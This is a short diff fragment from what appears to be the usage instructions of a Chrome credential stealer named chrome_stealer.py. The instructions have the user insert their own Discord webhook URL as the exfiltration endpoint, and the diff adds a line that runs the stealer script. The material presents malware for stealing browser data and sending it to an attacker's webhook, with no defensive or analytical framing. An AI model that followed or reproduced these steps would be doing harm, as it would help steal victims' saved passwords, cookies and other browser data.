@@ -81,6 +81,7 @@ Open chrome_stealer.py
 Locate the configuration block at the top of the file
 Replace the webhook URL with your own Discord webhook:
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
+python stealer.py
 
 ###Execution Flow
 Step	Action
